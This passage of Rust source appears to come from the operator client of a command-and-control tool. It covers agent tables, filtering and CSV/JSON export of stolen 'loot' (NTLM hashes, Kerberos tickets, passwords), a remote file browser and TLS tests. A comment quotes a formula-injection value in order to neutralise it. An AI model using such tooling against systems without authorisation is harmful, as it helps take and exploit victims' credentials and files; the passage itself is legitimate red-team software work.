    layout.nodes.iter().find(|node| node.id == node_id).map(|node| node.position)
}

fn graph_node_size(layout: &SessionGraphLayout, node_id: &str) -> Option<egui::Vec2> {
    layout.nodes.iter().find(|node| node.id == node_id).map(|node| node.size)
}

fn session_graph_world_to_screen(rect: Rect, graph_state: &SessionGraphState, world: Pos2) -> Pos2 {
    rect.center() + graph_state.pan + world.to_vec2() * graph_state.zoom
}

fn session_graph_node_rect(
    rect: Rect,
    graph_state: &SessionGraphState,
    world_center: Pos2,
    world_size: egui::Vec2,
) -> Rect {
    let center = session_graph_world_to_screen(rect, graph_state, world_center);
    Rect::from_center_size(center, world_size * graph_state.zoom)
}

fn session_graph_status_color(status: &str) -> Color32 {
    if agent_is_active_status(status) {
        Color32::from_rgb(84, 170, 110)
    } else {
        Color32::from_rgb(174, 68, 68)
    }
}

fn agent_is_active_status(status: &str) -> bool {
    matches!(status.trim().to_ascii_lowercase().as_str(), "alive" | "active" | "online" | "true")
}

fn agent_ip(agent: &transport::AgentSummary) -> String {
    if agent.internal_ip.trim().is_empty() {
        agent.external_ip.clone()
    } else {
        agent.internal_ip.clone()
    }
}

fn agent_arch(agent: &transport::AgentSummary) -> String {
    if agent.process_arch.trim().is_empty() {
        agent.os_arch.clone()
    } else {
        agent.process_arch.clone()
    }
}

fn agent_os(agent: &transport::AgentSummary) -> String {
    if agent.os_build.trim().is_empty() {
        agent.os_version.clone()
    } else {
        format!("{} ({})", agent.os_version, agent.os_build)
    }
}

fn agent_sleep_jitter(agent: &transport::AgentSummary) -> String {
    match (agent.sleep_delay.trim(), agent.sleep_jitter.trim()) {
        ("", "") => String::new(),
        (delay, "") => delay.to_owned(),
        ("", jitter) => format!("j{jitter}%"),
        (delay, jitter) => format!("{delay}s / {jitter}%"),
    }
}

fn agent_matches_filter(agent: &transport::AgentSummary, filter: &str) -> bool {
    let filter = filter.trim();
    if filter.is_empty() {
        return true;
    }

    let needle = filter.to_ascii_lowercase();
    [
        agent.name_id.as_str(),
        agent.hostname.as_str(),
        agent.username.as_str(),
        agent.domain_name.as_str(),
        agent.internal_ip.as_str(),
        agent.external_ip.as_str(),
        agent.process_pid.as_str(),
        agent.process_name.as_str(),
        agent.process_arch.as_str(),
        agent.os_version.as_str(),
        agent.os_build.as_str(),
        agent.note.as_str(),
    ]
    .into_iter()
    .any(|field| field.to_ascii_lowercase().contains(&needle))
}

fn filtered_process_rows<'a>(rows: &'a [ProcessEntry], filter: &str) -> Vec<&'a ProcessEntry> {
    let trimmed = filter.trim();
    if trimmed.is_empty() {
        return rows.iter().collect();
    }

    let needle = trimmed.to_ascii_lowercase();
    rows.iter()
        .filter(|row| {
            row.name.to_ascii_lowercase().contains(&needle) || row.pid.to_string().contains(&needle)
        })
        .collect()
}

fn normalized_process_arch(arch: &str) -> String {
    match arch.trim().to_ascii_lowercase().as_str() {
        "x86" | "386" | "i386" => "x86".to_owned(),
        _ => "x64".to_owned(),
    }
}

fn sort_agents(agents: &mut [transport::AgentSummary], column: AgentSortColumn, descending: bool) {
    agents.sort_by(|left, right| {
        let ordering = match column {
            AgentSortColumn::Id => left.name_id.cmp(&right.name_id),
            AgentSortColumn::Hostname => left.hostname.cmp(&right.hostname),
            AgentSortColumn::Username => left.username.cmp(&right.username),
            AgentSortColumn::Domain => left.domain_name.cmp(&right.domain_name),
            AgentSortColumn::Ip => agent_ip(left).cmp(&agent_ip(right)),
            AgentSortColumn::Pid => left.process_pid.cmp(&right.process_pid),
            AgentSortColumn::Process => left.process_name.cmp(&right.process_name),
            AgentSortColumn::Arch => agent_arch(left).cmp(&agent_arch(right)),
            AgentSortColumn::Elevated => left.elevated.cmp(&right.elevated),
            AgentSortColumn::Os => agent_os(left).cmp(&agent_os(right)),
            AgentSortColumn::SleepJitter => {
                agent_sleep_jitter(left).cmp(&agent_sleep_jitter(right))
            }
            AgentSortColumn::LastCheckin => left.last_call_in.cmp(&right.last_call_in),
        };
        let normalized = if ordering == std::cmp::Ordering::Equal {
            left.name_id.cmp(&right.name_id)
        } else {
            ordering
        };
        if descending { normalized.reverse() } else { normalized }
    });
}

fn sort_button_label(
    current_column: Option<AgentSortColumn>,
    descending: bool,
    button_column: AgentSortColumn,
) -> String {
    let name = AgentSortColumn::ALL
        .iter()
        .find_map(|(column, label)| (*column == button_column).then_some(*label))
        .unwrap_or("Column");
    if current_column == Some(button_column) {
        let arrow = if descending { "v" } else { "^" };
        format!("{name} {arrow}")
    } else {
        name.to_owned()
    }
}

fn ellipsize(value: &str, max_chars: usize) -> String {
    if value.chars().count() <= max_chars {
        return value.to_owned();
    }

    let mut output = String::new();
    for (index, ch) in value.chars().enumerate() {
        if index + 1 >= max_chars {
            break;
        }
        output.push(ch);
    }
    output.push_str("...");
    output
}

fn loot_matches_filters(
    item: &LootItem,
    type_filter: LootTypeFilter,
    cred_filter: CredentialSubFilter,
    file_filter: FileSubFilter,
    agent_filter: &str,
    since_filter: &str,
    until_filter: &str,
    text_filter: &str,
) -> bool {
    if !matches_loot_type_filter(item, type_filter, cred_filter, file_filter) {
        return false;
    }

    if !contains_ascii_case_insensitive(&item.agent_id, agent_filter) {
        return false;
    }

    // Time range filtering: `since_filter` is an inclusive lower bound, `until_filter` is an
    // inclusive upper bound.  Both are matched as string prefixes against `collected_at` so that
    // partial date strings like "2026-03" work as expected.
    let since = since_filter.trim();
    if !since.is_empty() && item.collected_at.as_str() < since {
        return false;
    }
    let until = until_filter.trim();
    if !until.is_empty() && item.collected_at.as_str() > until {
        return false;
    }

    [
        item.name.as_str(),
        item.source.as_str(),
        item.agent_id.as_str(),
        item.file_path.as_deref().unwrap_or_default(),
        item.preview.as_deref().unwrap_or_default(),
    ]
    .into_iter()
    .any(|field| contains_ascii_case_insensitive(field, text_filter))
}

fn matches_loot_type_filter(
    item: &LootItem,
    type_filter: LootTypeFilter,
    cred_filter: CredentialSubFilter,
    file_filter: FileSubFilter,
) -> bool {
    match type_filter {
        LootTypeFilter::All => true,
        LootTypeFilter::Credentials => {
            if !matches!(item.kind, LootKind::Credential) {
                return false;
            }
            matches_credential_sub_filter(item, cred_filter)
        }
        LootTypeFilter::Files => {
            if !matches!(item.kind, LootKind::File) {
                return false;
            }
            matches_file_sub_filter(item, file_filter)
        }
        LootTypeFilter::Screenshots => matches!(item.kind, LootKind::Screenshot),
    }
}

/// Detect a credential sub-category from name/preview/source heuristics.
fn detect_credential_category(item: &LootItem) -> CredentialSubFilter {
    let haystack =
        [item.name.as_str(), item.source.as_str(), item.preview.as_deref().unwrap_or_default()]
            .join(" ")
            .to_ascii_lowercase();

    if haystack.contains("ntlm") || haystack.contains("lm hash") || haystack.contains("nthash") {
        CredentialSubFilter::NtlmHash
    } else if haystack.contains("kerberos")
        || haystack.contains("kirbi")
        || haystack.contains(".ccache")
        || haystack.contains("tgt")
        || haystack.contains("tgs")
    {
        CredentialSubFilter::KerberosTicket
    } else if haystack.contains("certificate")
        || haystack.contains(".pfx")
        || haystack.contains(".pem")
        || haystack.contains(".crt")
        || haystack.contains(".cer")
    {
        CredentialSubFilter::Certificate
    } else if haystack.contains("plaintext")
        || haystack.contains("password")
        || haystack.contains("passwd")
        || haystack.contains("cleartext")
    {
        CredentialSubFilter::Plaintext
    } else {
        CredentialSubFilter::All
    }
}

/// Detect a file sub-category from the file extension or name.
fn detect_file_category(item: &LootItem) -> FileSubFilter {
    let path_str = item.file_path.as_deref().unwrap_or(item.name.as_str()).to_ascii_lowercase();
    let ext =
        std::path::Path::new(&path_str).extension().and_then(|e| e.to_str()).unwrap_or_default();

    const DOCUMENT_EXTS: &[&str] = &[
        "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "txt", "rtf", "odt", "ods", "csv",
        "md", "html", "htm", "xml", "json", "yaml", "yml",
    ];
    const ARCHIVE_EXTS: &[&str] =
        &["zip", "rar", "7z", "tar", "gz", "bz2", "xz", "cab", "iso", "tgz"];

    if DOCUMENT_EXTS.contains(&ext) {
        FileSubFilter::Document
    } else if ARCHIVE_EXTS.contains(&ext) {
        FileSubFilter::Archive
    } else if !ext.is_empty() {
        // Anything with an extension that is not a known document/archive is treated as binary.
        FileSubFilter::Binary
    } else {
        // No extension — heuristic: if the name contains "bin" or the path is a known binary
        // location, call it binary; otherwise treat as unknown (pass through).
        if path_str.contains("/bin/")
            || path_str.contains("\\bin\\")
            || ext == "exe"
            || ext == "dll"
        {
            FileSubFilter::Binary
        } else {
            FileSubFilter::All
        }
    }
}

fn matches_credential_sub_filter(item: &LootItem, filter: CredentialSubFilter) -> bool {
    if filter == CredentialSubFilter::All {
        return true;
    }
    detect_credential_category(item) == filter
}

fn matches_file_sub_filter(item: &LootItem, filter: FileSubFilter) -> bool {
    if filter == FileSubFilter::All {
        return true;
    }
    detect_file_category(item) == filter
}

/// Returns a short human-readable sub-category label for display in the loot list.
fn loot_sub_category_label(item: &LootItem) -> &'static str {
    match item.kind {
        LootKind::Credential => match detect_credential_category(item) {
            CredentialSubFilter::NtlmHash => "NTLM Hash",
            CredentialSubFilter::Plaintext => "Plaintext",
            CredentialSubFilter::KerberosTicket => "Kerberos",
            CredentialSubFilter::Certificate => "Certificate",
            CredentialSubFilter::All => "",
        },
        LootKind::File => match detect_file_category(item) {
            FileSubFilter::Document => "Document",
            FileSubFilter::Archive => "Archive",
            FileSubFilter::Binary => "Binary",
            FileSubFilter::All => "",
        },
        _ => "",
    }
}

/// Returns a color hint for the credential sub-category (for the table "Type" column).
fn credential_category_color(item: &LootItem) -> Color32 {
    match detect_credential_category(item) {
        CredentialSubFilter::NtlmHash => Color32::from_rgb(220, 160, 60), // amber
        CredentialSubFilter::Plaintext => Color32::from_rgb(110, 199, 141), // green
        CredentialSubFilter::KerberosTicket => Color32::from_rgb(140, 120, 220), // purple
        CredentialSubFilter::Certificate => Color32::from_rgb(80, 180, 220), // cyan
        CredentialSubFilter::All => Color32::GRAY,
    }
}

/// Export loot items to CSV and save to the downloads directory.
fn export_loot_csv(items: &[&LootItem]) -> std::result::Result<String, String> {
    let mut out = String::from(
        "id,kind,sub_category,name,agent_id,source,collected_at,file_path,size_bytes,preview\n",
    );
    for item in items {
        let sub = loot_sub_category_label(item);
        out.push_str(&csv_field(item.id.map(|v| v.to_string()).as_deref().unwrap_or("")));
        out.push(',');
        out.push_str(&csv_field(item.kind.label()));
        out.push(',');
        out.push_str(&csv_field(sub));
        out.push(',');
        out.push_str(&csv_field(&item.name));
        out.push(',');
        out.push_str(&csv_field(&item.agent_id));
        out.push(',');
        out.push_str(&csv_field(&item.source));
        out.push(',');
        out.push_str(&csv_field(&item.collected_at));
        out.push(',');
        out.push_str(&csv_field(item.file_path.as_deref().unwrap_or("")));
        out.push(',');
        out.push_str(&csv_field(item.size_bytes.map(|v| v.to_string()).as_deref().unwrap_or("")));
        out.push(',');
        out.push_str(&csv_field(item.preview.as_deref().unwrap_or("")));
        out.push('\n');
    }
    let output_dir = dirs::download_dir().unwrap_or_else(std::env::temp_dir);
    let output_path = next_available_path(&output_dir.join("loot.csv"));
    std::fs::write(&output_path, out.as_bytes()).map_err(|e| format!("Failed to save CSV: {e}"))?;
    Ok(format!("Exported {} item(s) to {}", items.len(), output_path.display()))
}

fn csv_field(value: &str) -> String {
    // Neutralize spreadsheet formula injection: prepend a single-quote to any value whose
    // first non-whitespace character is a formula trigger (`=`, `+`, `-`, `@`).  Loot data
    // is adversary-controlled, so an attacker on the target host could craft a credential
    // name or file path like `=EXEC("malware.exe")` that executes when an operator opens the
    // exported CSV in Excel or LibreOffice Calc.
    let effective: String = if value.trim_start().starts_with(['=', '+', '-', '@']) {
        format!("'{value}")
    } else {
        value.to_owned()
    };
    if effective.contains(',')
        || effective.contains('"')
        || effective.contains('\n')
        || effective.contains('\r')
    {
        format!("\"{}\"", effective.replace('"', "\"\""))
    } else {
        effective
    }
}

/// Export loot items to JSON and save to the downloads directory.
fn export_loot_json(items: &[&LootItem]) -> std::result::Result<String, String> {
    let mut out = String::from("[\n");
    for (index, item) in items.iter().enumerate() {
        let sub = loot_sub_category_label(item);
        out.push_str("  {");
        out.push_str(&format!("\"id\":{},", item.id.unwrap_or(0)));
        out.push_str(&format!("\"kind\":{},", json_str(item.kind.label())));
        out.push_str(&format!("\"sub_category\":{},", json_str(sub)));
        out.push_str(&format!("\"name\":{},", json_str(&item.name)));
        out.push_str(&format!("\"agent_id\":{},", json_str(&item.agent_id)));
        out.push_str(&format!("\"source\":{},", json_str(&item.source)));
        out.push_str(&format!("\"collected_at\":{},", json_str(&item.collected_at)));
        out.push_str(&format!(
            "\"file_path\":{},",
            item.file_path.as_deref().map(json_str).unwrap_or_else(|| "null".to_owned())
        ));
        out.push_str(&format!(
            "\"size_bytes\":{},",
            item.size_bytes.map(|v| v.to_string()).unwrap_or_else(|| "null".to_owned())
        ));
        out.push_str(&format!(
            "\"preview\":{}",
            item.preview.as_deref().map(json_str).unwrap_or_else(|| "null".to_owned())
        ));
        out.push('}');
        if index + 1 < items.len() {
            out.push(',');
        }
        out.push('\n');
    }
    out.push(']');
    let output_dir = dirs::download_dir().unwrap_or_else(std::env::temp_dir);
    let output_path = next_available_path(&output_dir.join("loot.json"));
    std::fs::write(&output_path, out.as_bytes())
        .map_err(|e| format!("Failed to save JSON: {e}"))?;
    Ok(format!("Exported {} item(s) to {}", items.len(), output_path.display()))
}

fn json_str(value: &str) -> String {
    let escaped = value
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t");
    format!("\"{escaped}\"")
}

fn contains_ascii_case_insensitive(haystack: &str, needle: &str) -> bool {
    let trimmed = needle.trim();
    trimmed.is_empty() || haystack.to_ascii_lowercase().contains(&trimmed.to_ascii_lowercase())
}

fn loot_is_downloadable(item: &LootItem) -> bool {
    matches!(item.kind, LootKind::File | LootKind::Screenshot) && item.content_base64.is_some()
}

fn download_loot_item(item: &LootItem) -> std::result::Result<String, String> {
    let Some(encoded) = &item.content_base64 else {
        return Err("This loot item does not include downloadable content.".to_owned());
    };
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .map_err(|error| format!("Failed to decode loot payload: {error}"))?;
    let file_name = derive_download_file_name(item);
    let output_dir = dirs::download_dir().unwrap_or_else(std::env::temp_dir);
    let output_path = next_available_path(&output_dir.join(file_name));
    std::fs::write(&output_path, bytes)
        .map_err(|error| format!("Failed to save loot file: {error}"))?;
    Ok(format!("Saved {}", output_path.display()))
}

fn derive_download_file_name(item: &LootItem) -> String {
    let candidate = item
        .file_path
        .as_deref()
        .and_then(|path| std::path::Path::new(path).file_name())
        .and_then(|value| value.to_str())
        .unwrap_or(item.name.as_str());
    sanitize_file_name(candidate)
}

fn sanitize_file_name(name: &str) -> String {
    let sanitized: String = name
        .chars()
        .map(|ch| match ch {
            '/' | '\\' | ':' | '*' | '?' | '"' | '<' | '>' | '|' => '_',
            _ => ch,
        })
        .collect();
    if sanitized.trim().is_empty() { "loot.bin".to_owned() } else { sanitized }
}

fn next_available_path(path: &std::path::Path) -> std::path::PathBuf {
    if !path.exists() {
        return path.to_path_buf();
    }

    let stem = path.file_stem().and_then(|value| value.to_str()).unwrap_or("loot");
    let extension = path.extension().and_then(|value| value.to_str()).unwrap_or_default();
    for index in 1..1000 {
        let candidate = if extension.is_empty() {
            path.with_file_name(format!("{stem}-{index}"))
        } else {
            path.with_file_name(format!("{stem}-{index}.{extension}"))
        };
        if !candidate.exists() {
            return candidate;
        }
    }

    path.to_path_buf()
}

fn blank_if_empty<'a>(value: &'a str, fallback: &'a str) -> &'a str {
    if value.trim().is_empty() { fallback } else { value }
}

fn upload_destination(
    browser: Option<&AgentFileBrowserState>,
    selected_path: Option<&str>,
) -> Option<String> {
    selected_remote_directory(browser, selected_path)
        .or_else(|| browser.and_then(|state| state.current_dir.clone()))
}

fn selected_remote_directory(
    browser: Option<&AgentFileBrowserState>,
    selected_path: Option<&str>,
) -> Option<String> {
    selected_path.and_then(|path| {
        browser.and_then(|state| {
            find_file_entry(state, path).map(|entry| {
                if entry.is_dir {
                    entry.path.clone()
                } else {
                    parent_remote_path(&entry.path).unwrap_or_else(|| entry.path.clone())
                }
            })
        })
    })
}

fn find_file_entry<'a>(
    browser: &'a AgentFileBrowserState,
    path: &str,
) -> Option<&'a FileBrowserEntry> {
    browser.directories.values().flat_map(|entries| entries.iter()).find(|entry| entry.path == path)
}

fn parent_remote_path(path: &str) -> Option<String> {
    let trimmed = path.trim_end_matches(['\\', '/']);
    if trimmed.is_empty() {
        return None;
    }

    if let Some(index) = trimmed.rfind(['\\', '/']) {
        let parent = &trimmed[..=index];
        if parent.is_empty() { None } else { Some(parent.to_owned()) }
    } else {
        None
    }
}

fn join_remote_path(base: &str, name: &str) -> String {
    if base.is_empty() {
        return name.to_owned();
    }

    let separator = if base.contains('\\') { '\\' } else { '/' };
    if base.ends_with('\\') || base.ends_with('/') {
        format!("{base}{name}")
    } else {
        format!("{base}{separator}{name}")
    }
}

/// Return the dominant path separator for a remote path (`\` for Windows, `/` otherwise).
fn path_separator(path: &str) -> &'static str {
    if path.contains('\\') { "\\" } else { "/" }
}

/// Split a remote path into `(label, cumulative_path)` pairs for breadcrumb rendering.
fn breadcrumb_segments(path: &str) -> Vec<(String, String)> {
    let sep = if path.contains('\\') { '\\' } else { '/' };
    let mut segments = Vec::new();

    // Handle Windows drive root: "C:\\" → segment ("C:\\", "C:\\")
    let trimmed_for_check = path.trim_end_matches(sep);
    if trimmed_for_check.len() >= 2 && trimmed_for_check.as_bytes()[1] == b':' {
        let drive_root = format!("{}:{sep}", &trimmed_for_check[..1]);
        segments.push((drive_root.clone(), drive_root.clone()));

        let rest_start = drive_root.len().min(path.len());
        let rest = path[rest_start..].trim_matches(sep);
        if !rest.is_empty() {
            let mut cumulative = drive_root;
            for part in rest.split(sep) {
                if part.is_empty() {
                    continue;
                }
                cumulative = format!("{cumulative}{part}{sep}");
                segments.push((part.to_owned(), cumulative.clone()));
            }
        }
        return segments;
    }

    // Unix-style: starts with "/"
    if path.starts_with(sep) {
        let root = sep.to_string();
        segments.push((root.clone(), root.clone()));

        let rest = path[1..].trim_end_matches(sep);
        if !rest.is_empty() {
            let mut cumulative = String::from(sep);
            for part in rest.split(sep) {
                if part.is_empty() {
                    continue;
                }
                cumulative = format!("{cumulative}{part}{sep}");
                segments.push((part.to_owned(), cumulative.clone()));
            }
        }
        return segments;
    }

    // Relative path — just split on separator
    let mut cumulative = String::new();
    for part in path.trim_end_matches(sep).split(sep) {
        if part.is_empty() {
            continue;
        }
        if cumulative.is_empty() {
            cumulative = format!("{part}{sep}");
        } else {
            cumulative = format!("{cumulative}{part}{sep}");
        }
        segments.push((part.to_owned(), cumulative.clone()));
    }
    segments
}

fn directory_label(path: &str) -> String {
    if path.ends_with(':') || path.ends_with(":\\") || path.ends_with(":/") {
        return path.to_owned();
    }

    let trimmed = path.trim_end_matches(['\\', '/']);
    Path::new(trimmed)
        .file_name()
        .and_then(|value| value.to_str())
        .filter(|value| !value.is_empty())
        .unwrap_or(trimmed)
        .to_owned()
}

fn file_entry_label(entry: &FileBrowserEntry) -> String {
    let size = if entry.size_label.trim().is_empty() { "-" } else { entry.size_label.as_str() };
    let modified = blank_if_empty(&entry.modified_at, "-");
    let permissions = blank_if_empty(&entry.permissions, "-");
    format!("{}  [{size} | {modified} | {permissions}]", entry.name)
}

fn human_size(size_bytes: u64) -> String {
    const UNITS: [&str; 4] = ["B", "KB", "MB", "GB"];

    let mut size = size_bytes as f64;
    let mut unit = 0_usize;
    while size >= 1024.0 && unit + 1 < UNITS.len() {
        size /= 1024.0;
        unit += 1;
    }

    if unit == 0 {
        format!("{size_bytes} {}", UNITS[unit])
    } else {
        format!("{size:.1} {}", UNITS[unit])
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use clap::Parser;
    use std::sync::{LazyLock, Mutex, MutexGuard};
    use std::time::{SystemTime, UNIX_EPOCH};
    use transport::{AgentFileBrowserState, AgentSummary, FileBrowserEntry, LootItem};

    static EXPORT_TEST_LOCK: LazyLock<Mutex<()>> = LazyLock::new(|| Mutex::new(()));

    fn lock_export_test() -> MutexGuard<'static, ()> {
        EXPORT_TEST_LOCK.lock().unwrap_or_else(|poisoned| poisoned.into_inner())
    }

    #[test]
    fn cli_uses_default_server_url() {
        let cli = Cli::parse_from(["red-cell-client"]);
        assert_eq!(cli.server, DEFAULT_SERVER_URL);
    }

    #[test]
    fn cli_accepts_custom_server_url() {
        let cli = Cli::parse_from([
            "red-cell-client",
            "--server",
            "wss://teamserver.example.test/havoc/",
        ]);
        assert_eq!(cli.server, "wss://teamserver.example.test/havoc/");
    }

    #[test]
    fn cli_accepts_scripts_dir() {
        let cli =
            Cli::parse_from(["red-cell-client", "--scripts-dir", "/tmp/red-cell-client-scripts"]);
        assert_eq!(cli.scripts_dir, Some(PathBuf::from("/tmp/red-cell-client-scripts")));
    }

    #[test]
    fn cli_accepts_tls_flags() {
        let cli = Cli::parse_from([
            "red-cell-client",
            "--ca-cert",
            "/tmp/ca.pem",
            "--cert-fingerprint",
            "abcd1234",
        ]);
        assert_eq!(cli.ca_cert, Some(PathBuf::from("/tmp/ca.pem")));
        assert_eq!(cli.cert_fingerprint.as_deref(), Some("abcd1234"));
        assert!(!cli.accept_invalid_certs);
    }

    #[test]
    fn cli_optional_fields_default_to_none() {
        let cli = Cli::parse_from(["red-cell-client"]);
        assert!(cli.scripts_dir.is_none());
        assert!(cli.ca_cert.is_none());
        assert!(cli.cert_fingerprint.is_none());
    }

    #[test]
    fn cli_accept_invalid_certs_defaults_to_false() {
        let cli = Cli::parse_from(["red-cell-client"]);
        assert!(!cli.accept_invalid_certs);
    }

    #[test]
    fn cli_accept_invalid_certs_flag_sets_true() {
        let cli = Cli::parse_from(["red-cell-client", "--accept-invalid-certs"]);
        assert!(cli.accept_invalid_certs);
    }

    #[test]
    fn cli_rejects_unknown_args() {
        let result = Cli::try_parse_from(["red-cell-client", "--nonexistent-flag"]);
        assert!(result.is_err());
    }

    #[test]
    fn cli_rejects_unknown_positional_args() {
        let result = Cli::try_parse_from(["red-cell-client", "unexpected-positional"]);
        assert!(result.is_err());
    }

    #[test]
    fn resolve_tls_prefers_cli_accept_invalid_certs() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: Some(PathBuf::from("/tmp/ca.pem")),
            cert_fingerprint: Some("abcd".to_owned()),
            accept_invalid_certs: true,
            purge_known_server: None,
        };
        let config = LocalConfig::default();
        assert!(matches!(
            resolve_tls_verification(&cli, &config, &KnownServersStore::default(), &cli.server)
                .unwrap(),
            TlsVerification::DangerousSkipVerify
        ));
    }

    #[test]
    fn resolve_tls_prefers_cli_fingerprint_over_ca() {
        let valid_fp = "a".repeat(64);
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: Some(PathBuf::from("/tmp/ca.pem")),
            cert_fingerprint: Some(valid_fp.clone()),
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let config = LocalConfig::default();
        assert!(matches!(
            resolve_tls_verification(&cli, &config, &KnownServersStore::default(), &cli.server).unwrap(),
            TlsVerification::Fingerprint(ref fp) if fp == &valid_fp
        ));
    }

    #[test]
    fn resolve_tls_falls_back_to_config_fingerprint() {
        let valid_fp = "b".repeat(64);
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let config =
            LocalConfig { cert_fingerprint: Some(valid_fp.clone()), ..LocalConfig::default() };
        assert!(matches!(
            resolve_tls_verification(&cli, &config, &KnownServersStore::default(), &cli.server).unwrap(),
            TlsVerification::Fingerprint(ref fp) if fp == &valid_fp
        ));
    }

    #[test]
    fn resolve_tls_uses_custom_ca_when_cli_ca_cert_is_set() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: Some(PathBuf::from("/tmp/cli-ca.pem")),
            cert_fingerprint: None,
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let config = LocalConfig::default();
        assert!(matches!(
            resolve_tls_verification(&cli, &config, &KnownServersStore::default(), &cli.server).unwrap(),
            TlsVerification::CustomCa(ref path) if path == &PathBuf::from("/tmp/cli-ca.pem")
        ));
    }

    #[test]
    fn resolve_tls_prefers_cli_custom_ca_over_config_custom_ca() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: Some(PathBuf::from("/tmp/cli-ca.pem")),
            cert_fingerprint: None,
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let config = LocalConfig {
            ca_cert: Some(PathBuf::from("/tmp/config-ca.pem")),
            ..LocalConfig::default()
        };
        assert!(matches!(
            resolve_tls_verification(&cli, &config, &KnownServersStore::default(), &cli.server).unwrap(),
            TlsVerification::CustomCa(ref path) if path == &PathBuf::from("/tmp/cli-ca.pem")
        ));
    }

    #[test]
    fn resolve_tls_falls_back_to_config_custom_ca() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let config = LocalConfig {
            ca_cert: Some(PathBuf::from("/tmp/config-ca.pem")),
            ..LocalConfig::default()
        };
        assert!(matches!(
            resolve_tls_verification(&cli, &config, &KnownServersStore::default(), &cli.server).unwrap(),
            TlsVerification::CustomCa(ref path) if path == &PathBuf::from("/tmp/config-ca.pem")
        ));
    }

    #[test]
    fn resolve_tls_defaults_to_certificate_authority() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let config = LocalConfig::default();
        assert!(matches!(
            resolve_tls_verification(&cli, &config, &KnownServersStore::default(), &cli.server)
                .unwrap(),
            TlsVerification::CertificateAuthority
        ));
    }

    #[test]
    fn validate_fingerprint_accepts_valid_sha256_hex() {
        let valid_lower = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
        assert!(validate_fingerprint(valid_lower, "test").is_ok());

        let valid_upper = "ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789";
        assert!(validate_fingerprint(valid_upper, "test").is_ok());

        let valid_mixed = "AbCdEf0123456789abcDEF0123456789ABCDEF0123456789abcdef0123456789";
        assert!(validate_fingerprint(valid_mixed, "test").is_ok());
    }

    #[test]
    fn validate_fingerprint_rejects_wrong_length() {
        let too_short = "abcdef";
        let err = validate_fingerprint(too_short, "test").unwrap_err();
        assert!(err.to_string().contains("6 characters"), "error: {err}");

        let too_long = "a".repeat(65);
        let err = validate_fingerprint(&too_long, "test").unwrap_err();
        assert!(err.to_string().contains("65 characters"), "error: {err}");

        let empty = "";
        let err = validate_fingerprint(empty, "test").unwrap_err();
        assert!(err.to_string().contains("0 characters"), "error: {err}");
    }

    #[test]
    fn validate_fingerprint_rejects_non_hex_chars() {
        // 64 chars but contains spaces (non-hex)
        let with_spaces = format!("{}    ", "a".repeat(60));
        assert_eq!(with_spaces.len(), 64);
        let err = validate_fingerprint(&with_spaces, "test").unwrap_err();
        assert!(err.to_string().contains("non-hex"), "error: {err}");

        // 64 chars but contains 'g'
        let with_invalid = "g".repeat(64);
        let err = validate_fingerprint(&with_invalid, "test").unwrap_err();
        assert!(err.to_string().contains("non-hex"), "error: {err}");
    }

    #[test]
    fn resolve_tls_rejects_malformed_cli_fingerprint() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: Some("not-a-valid-fingerprint".to_owned()),
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let config = LocalConfig::default();
        let err =
            resolve_tls_verification(&cli, &config, &KnownServersStore::default(), &cli.server)
                .unwrap_err();
        assert!(err.to_string().contains("--cert-fingerprint"), "error: {err}");
    }

    #[test]
    fn resolve_tls_rejects_malformed_config_fingerprint() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let config =
            LocalConfig { cert_fingerprint: Some("zzzz".to_owned()), ..LocalConfig::default() };
        let err =
            resolve_tls_verification(&cli, &config, &KnownServersStore::default(), &cli.server)
                .unwrap_err();
        assert!(err.to_string().contains("config file"), "error: {err}");
    }

    #[test]
    fn resolve_tls_accept_invalid_certs_skips_fingerprint_validation() {
        // Even with an invalid fingerprint, --accept-invalid-certs takes precedence
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: Some("bad".to_owned()),
            accept_invalid_certs: true,
            purge_known_server: None,
        };
        let config = LocalConfig::default();
        assert!(matches!(
            resolve_tls_verification(&cli, &config, &KnownServersStore::default(), &cli.server)
                .unwrap(),
            TlsVerification::DangerousSkipVerify
        ));
    }

    #[test]
    fn resolve_tls_uses_known_servers_fingerprint() {
        let fp = "c".repeat(64);
        let mut known = KnownServersStore::default();
        known.trust("127.0.0.1:40056", &fp, None);
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let config = LocalConfig::default();
        assert!(matches!(
            resolve_tls_verification(&cli, &config, &known, &cli.server).unwrap(),
            TlsVerification::Fingerprint(ref f) if f == &fp
        ));
    }

    #[test]
